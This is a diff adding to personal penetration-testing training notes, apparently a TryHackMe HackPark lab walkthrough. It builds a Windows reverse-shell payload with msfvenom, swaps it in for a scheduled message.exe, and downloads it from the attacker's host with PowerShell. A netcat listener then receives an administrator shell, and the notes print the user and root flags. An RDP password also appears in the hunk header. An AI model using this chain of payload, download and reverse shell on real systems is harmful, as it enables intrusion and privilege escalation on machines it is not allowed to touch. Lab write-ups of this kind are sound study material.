@@ -177,3 +177,70 @@ kali@kali:~/oscptraining$ xfreerdp /u:administrator /p:4q6XvFES7Fdxs /v:10.10.4.
 
 supposed to exploit message.exe that is running every 60s
 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.102.117 LPORT=8888 -f exe > message.exe
+
+
+powershell Invoke-WebRequest -Uri http://10.8.102.117:80/Message.exe -Outfile 'C:\Program Files (x86)\SystemScheduler\Message.exe'
+
+get it in then wait for it to execute and we get our reverse shell with admin privilege!
+
+
+_______________________________________________________________________________________________________
+kali@kali:~/oscptraining/tryhackme/hackpack$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [10.8.102.117] from (UNKNOWN) [10.10.16.37] 49336
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\PROGRA~2\SYSTEM~1>cd ..
+cd ..
+
+C:\PROGRA~2>whoami
+whoami
+hackpark\administrator
+
+C:\PROGRA~2>
+
+
+C:\Users\jeff\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of C:\Users\jeff\Desktop
+
+08/04/2019  11:55 AM    <DIR>          .
+08/04/2019  11:55 AM    <DIR>          ..
+08/04/2019  11:57 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  39,119,171,584 bytes free
+
+C:\Users\jeff\Desktop>type user.txt
+type user.txt
+759bd8af507517bcfaede78a21a73e39
+C:\Users\jeff\Desktop>
+
+
+_______________________________________________________________________________________________________
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of C:\Users\Administrator\Desktop
+
+08/04/2019  11:49 AM    <DIR>          .
+08/04/2019  11:49 AM    <DIR>          ..
+08/04/2019  11:51 AM                32 root.txt
+08/04/2019  04:36 AM             1,029 System Scheduler.lnk
+               2 File(s)          1,061 bytes
+               2 Dir(s)  39,119,171,584 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+C:\Users\Administrator\Desktop>
+
+_______________________________________________________________________________________________________
+
+completed 05 May 1126hr
